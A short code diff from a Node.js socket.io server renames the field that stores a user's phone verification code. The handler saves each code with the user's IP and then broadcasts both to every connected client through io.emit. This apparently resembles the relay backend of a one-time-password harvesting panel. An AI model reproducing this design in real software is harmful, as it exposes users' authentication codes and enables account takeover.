@@ -306,14 +306,14 @@ io.on("connection", (socket) => {
       const saved = await PhoneCode.create({
         user: user._id,
         ip,
-        code: verification_code_three,
+        verification_code_three: verification_code_three,
         time: Date.now(),
       });
 
       // 4) Broadcast + ack
       io.emit("newPhoneCode", {
         ip: user.ip,
-        verification_code_three: saved.code,
+        verification_code_three: saved.verification_code_three,
         time: saved.time,
       });
       socket.emit("ackPhoneCode", { success: true, error: null });
